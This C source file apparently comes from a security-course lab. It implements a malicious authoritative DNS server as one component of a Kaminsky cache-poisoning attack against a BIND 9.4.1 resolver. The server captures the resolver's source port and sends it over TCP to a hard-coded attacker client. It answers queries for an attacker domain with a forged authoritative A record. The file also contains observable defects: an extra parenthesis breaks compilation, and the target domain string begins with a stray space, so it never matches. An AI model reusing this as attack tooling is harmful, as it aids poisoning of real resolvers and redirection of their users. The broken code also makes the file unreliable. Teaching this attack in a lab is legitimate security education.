#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// #include <errno.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>

#include <ldns/ldns.h> // LDNS library

#define BUFFER_SIZE 1024

#define PORT_DNS 53

#define ATTACKER_CLIENT_IP   "192.168.1.202"
#define RESOLVER_IP   "192.168.1.203"
#define ATTACKER_TCP_PORT    1234        //todo check port
#define MAX_LEN_PORT 64

static void send_resolver_port_over_tcp(uint16_t port) {
  int sockfd;
  struct sockaddr_in dest;
  char buf[MAX_LEN_PORT];
  int len;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    perror("socket (tcp)");
    return;
  }

  // setting options - taken from ex0.pdf
  // allows reusing a local addr (IP+PORT) even if it's still marked "in use" after closing
  // (in case restarting server quickly)
  int opt = 1;
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
    printf("setsockopt(SO_REUSEADDR) failed...\n");
    close(sockfd);
    exit(1);
  }
  // reusing port - allows multiple sockets (or processes) to bind to the same port number.
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
    printf("setsockopt(SO_REUSEPORT) failed...\n");
    close(sockfd);
    exit(1);
  }

  memset(&dest, 0, sizeof(dest));
  dest.sin_family = AF_INET;
  dest.sin_port = htons(ATTACKER_TCP_PORT);
  if (inet_pton(AF_INET, ATTACKER_CLIENT_IP, &dest.sin_addr) != 1) {
    perror("inet_pton");
    close(sockfd);
    return;
  }

  if (connect(sockfd, (struct sockaddr *)&dest, (socklen_t)sizeof(dest)) < 0) {
    perror("connect to attacker client");
    close(sockfd);
    return;
  }

  len = snprintf(buf, sizeof(buf), "%u\n", (unsigned int)port);
  if (len < 0 || len >= (int)sizeof(buf)) {
    fprintf(stderr, "snprintf error when formatting port\n");
    close(sockfd);
    return;
  }

  if (send(sockfd, buf, (size_t)len, 0) < 0) {
    perror("send(port)");
  } else {
    printf("sent resolver port %u to attacker client over TCP\n",
           (unsigned int)port);
  }

  close(sockfd);
}

/**
 * parse_dns_query - Parse raw DNS query buffer into ldns packet structure
 * @buffer: Raw DNS query buffer
 * @len: Length of the buffer
 * @query_pkt: Pointer to store the parsed packet (output parameter)
 *
 * Returns: LDNS_STATUS_OK on success, error status otherwise
 */
ldns_status parse_dns_query(unsigned char *buffer, size_t len, ldns_pkt **query_pkt) {

  // ldns_wire2pkt decodes raw DNS bytes (buffer) into a structured ldns_pkt
  ldns_status status = ldns_wire2pkt(query_pkt, buffer, len);

  if (status != LDNS_STATUS_OK) {
    fprintf(stderr, "Failed to parse DNS query: %s\n",
            ldns_get_errorstr_by_id(status));
    // todo maybe free
  }
  return status;
}

/**
 * log_client_info - Log client IP address and source port
 * @client_addr: Client's socket address structure
 *
 * This function extracts and displays the source port which is critical
 * for the Kaminsky DNS cache poisoning attack.
 */
void log_client_info(struct sockaddr_in *client_addr) {
  uint16_t source_port = ntohs(client_addr->sin_port);
  char *client_ip =  inet_ntoa(client_addr->sin_addr);

  printf("======================================================\n");
  printf("| DNS Query Received                                 |\n");
  printf("|                                                    |\n");
  printf("| Source IP:   %-37s |\n", client_ip);
  printf("| Source Port: %-37u |\n", source_port);
  printf("|====================================================\n");
}

/**
 * print_query_details - Display DNS query name and type
 * @query_pkt: Parsed DNS query packet
 *
 * Extracts and prints the queried domain name and record type.
 */
void print_query_details(ldns_pkt *query_pkt) {

  ldns_rr_list *q_list = ldns_pkt_question(query_pkt);

  if (q_list == NULL || ldns_rr_list_rr_count(q_list)==0) {
    //if the list doesnt exist or is empty
    return;
  }
  // TAKE THE FIRST QUESTION - USUALLY ONE PER PACKET
  ldns_rr *question = ldns_rr_list_rr(q_list, 0);
  char *qname = ldns_rdf2str(ldns_rr_owner(question));
  ldns_rr_type qtype = ldns_rr_get_type(question);
  // 'ldns_rdf2str' converts domain to human readable
  // todo maybe print the conversion to see it succeeded
  printf("Query: %s (Type: %s)\n\n", qname, ldns_rr_type2str(qtype));
  free(qname);
}

/**
 * create_dns_response - Build a DNS response packet with dummy answer
 * @query_pkt: Original query packet
 *
 * Creates a DNS response with:
 * - Same transaction ID as query
 * - Authoritative Answer (AA) flag set
 * - A record pointing to 1.2.3.4
 *
 * Returns: Newly allocated response packet (caller must free)
 */
ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {

  ldns_pkt *response_pkt = ldns_pkt_new();
  if (response_pkt == NULL) {
    fprintf(stderr,"ldns_pkt_new failed\n");
    return NULL;
  }
  // copy basic header fields from query
  uint16_t query_id = ldns_pkt_id(query_pkt);

  // Set response flags
  ldns_pkt_set_id(response_pkt, query_id);
  ldns_pkt_set_qr(response_pkt, 1);  // 1 if the message is of answer type
  ldns_pkt_set_aa(response_pkt, 1);  // 1 if authoritative
  ldns_pkt_set_opcode(response_pkt, ldns_pkt_get_opcode(query_pkt));
  // when server answers, it copies RD field from the query
  ldns_pkt_set_rd(response_pkt, ldns_pkt_rd(query_pkt));
  // 'recursion available' is set to 0 in queries (authoritative server)
  ldns_pkt_set_ra(response_pkt, 0);
  // todo: remove the 2 rows below
//  ldns_pkt_set_ad(response_pkt, 0);  // Zero flag (authentic data)
//  ldns_pkt_set_cd(response_pkt, 0);  // Zero flag (checking disabled)

  // Copy question section into the response
  ldns_rr *question = ldns_rr_list_rr(ldns_pkt_question(query_pkt), 0);
  ldns_pkt_push_rr(response_pkt, LDNS_SECTION_QUESTION, ldns_rr_clone(question));

  // Create answer record - only if it's A record for
  // www.attacker.cybercourse.example.com (A record pointing to 6.6.6.6)

  char *qname = ldns_rdf2str(ldns_rr_owner(question));
  ldns_rr_type qtype = ldns_rr_get_type(question);
  ldns_rr_class qclass = ldns_rr_get_class(question);
  const char *attacker_target = " www.attacker.cybercourse.example.com.";
  const char *attacker_ip = "192.168.1.201";
  // sanity check
  if(qtype==LDNS_RR_TYPE_A &&
     qclass==LDNS_RR_CLASS_IN &&
     strcmp(qname,attacker_target)==0){
    printf("-> matching A query for attacker domain, sending A=%s\n",
           attacker_ip);
    // create RDF for the owner name and IP address
    ldns_rdf *owner = NULL;
    ldns_rdf *rdata_ip = NULL;
    // ldns_rr *answer_rr = NULL;

    owner = ldns_rdf_clone(ldns_rr_owner(question)); // owner = qname (same domain)
    if (owner == NULL) {
      fprintf(stderr,"ldns_rdf_clone failed\n");
      free(qname);
      return NULL;
    }

    // create A record rdata from string ip
    ldns_status new_status = ldns_str2rdf_a(&rdata_ip, attacker_ip);
    if (new_status != LDNS_STATUS_OK){
      //TODO HANDLE
      fprintf(stderr,"ldns_str2rdf_a failed\n");
      free(qname);
      return NULL;
    }
    ldns_rr *answer = ldns_rr_new();
    if (answer == NULL) {
      fprintf(stderr,"ldns_rr_new failed\n");
      free(qname);
      return NULL;
    }
    ldns_rr_set_owner(answer, owner);
    ldns_rr_set_class(answer, LDNS_RR_CLASS_IN);
    ldns_rr_set_type(answer, LDNS_RR_TYPE_A);
    ldns_rr_set_ttl(answer, 300U);
    ldns_rr_push_rdf(answer, rdata_ip);
    // PREVIOUS - INSTEAD OF RDATA_IP
//  ldns_rdf *rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4");
//  ldns_rr_push_rdf(answer, rdf);

    ldns_pkt_push_rr(response_pkt, LDNS_SECTION_ANSWER, answer);

  }
  else{
    // if not our specific name, answer with no error and no answer
    ldns_pkt_set_rcode(response_pkt,LDNS_RCODE_NOERROR);
  }
  free(qname);
  return response_pkt;
}

/**
 * send_dns_response - Convert response packet to wire format and send
 * @sockfd: UDP socket file descriptor
 * @client_addr: Client's socket address to send response to
 * @response_pkt: DNS response packet to send
 *
 * Converts the packet to wire format and sends it via UDP.
 *
 * Returns: 0 on success, -1 on failure
 */
int send_dns_response(int sockfd, struct sockaddr_in *client_addr,
                      ldns_pkt *response_pkt) {
  uint8_t *response_wire = NULL;
  size_t response_size = 0U;

  ldns_status status = ldns_pkt2wire(&response_wire, response_pkt, &response_size);
  if (status != LDNS_STATUS_OK) {
    fprintf(stderr, "Failed to convert packet to wire format\n");
    return -1;
  }

  int sent = (int)sendto(sockfd, response_wire, response_size, 0,
                         (struct sockaddr *)client_addr, sizeof(*client_addr));
  free(response_wire);

  return (sent < 0) ? -1 : 0;
}

/**
 * handle_dns_query - Main handler for incoming DNS queries
 * @sockfd: UDP socket file descriptor
 * @client_addr: Client's socket address
 * @buffer: Raw DNS query buffer
 * @len: Length of the buffer
 *
 * Orchestrates the complete DNS query handling process:
 * 1. Parse the query
 * 2. Log client information (especially source port for Kaminsky attack)
 * 3. Display query details
 * 4. Create response
 * 5. Send response back to client
 */
void handle_dns_query(int sockfd, struct sockaddr_in *client_addr,
                      unsigned char *buffer, size_t len) {
  ldns_pkt *query_pkt = NULL;
  ldns_pkt *response_pkt = NULL;

  // Parse incoming query
  if (parse_dns_query(buffer, len, &query_pkt) != LDNS_STATUS_OK) {
    return;
  }

  // Log client info (captures source port for attack)
  log_client_info(client_addr);

  // Display query details
  print_query_details(query_pkt);

  // Build response packet
  response_pkt = create_dns_response(query_pkt);

  // check if not NULL
  if (response_pkt==NULL) {
    ldns_pkt_free(query_pkt);
    return;
  }

  // Send response
  send_dns_response(sockfd, client_addr, response_pkt);

  // Cleanup
  ldns_pkt_free(query_pkt);
  ldns_pkt_free(response_pkt);
}

int main() {

  int sockfd;
  struct sockaddr_in server_addr;
  unsigned char buffer[BUFFER_SIZE];

  // Create UDP socket | SOCK_DGRAM - UDP | AF_INET - IPv4
  if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
    perror("socket");
    exit(EXIT_FAILURE);
  }

  // Set socket options - allow address and port reuse
  int opt = 1;
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt,
                 sizeof(opt)) < 0) {
    printf("setsockopt(SO_REUSEADDR) failed...\n");
    close(sockfd);
    exit(1);
  }
  opt = 1;
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt,
                 sizeof(opt)) < 0) {
    printf("setsockopt(SO_REUSEPORT) failed...\n");
    close(sockfd);
    exit(1);
  }

  // Bind socket
  // any UDP DNS packet arriving at port 53 in the container goes here
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  server_addr.sin_port = htons(PORT_DNS);

  if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
    perror("bind");
    close(sockfd);
    exit(EXIT_FAILURE);
  }

  printf("DNS Server listening on UDP port %d\n", PORT_DNS);
  printf("Waiting for queries from BIND 9.4.1 recursive resolver...\n\n");

  int resolver_udp_port_sent = 0;
  // Receive and handle DNS queries
  while (1) {
    // waits for a packet, stores it in buf and records sender's address
    // in client_addr (so we can reply)
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = (socklen_t)sizeof(client_addr);

    // receive a DNS packet
    ssize_t bytes_received = recvfrom(sockfd, buffer, BUFFER_SIZE, 0,
                                      (struct sockaddr *) &client_addr, &client_addr_len);

    if (bytes_received < 0) {
      perror("recvfrom");
      continue;
    }
    char *src_ip_str = inet_ntoa(client_addr.sin_addr);
    uint16_t src_port = ntohs(client_addr.sin_port);
    printf("Got %zd bytes from %s:%u\n",bytes_received,inet_ntoa(client_addr.sin_addr),(unsigned
    int)
    src_port));
    // if this packet is from resolver and we havent sent the port yet
    if (resolver_udp_port_sent==0 && strcmp(src_ip_str,RESOLVER_IP)==0){
      send_resolver_port_over_tcp ((int) src_port);
      resolver_udp_port_sent=1;
    }

    // Handle the DNS query and capture source port
    handle_dns_query(sockfd, &client_addr, buffer, (size_t)bytes_received);
  }

  close(sockfd);
  return 0;
}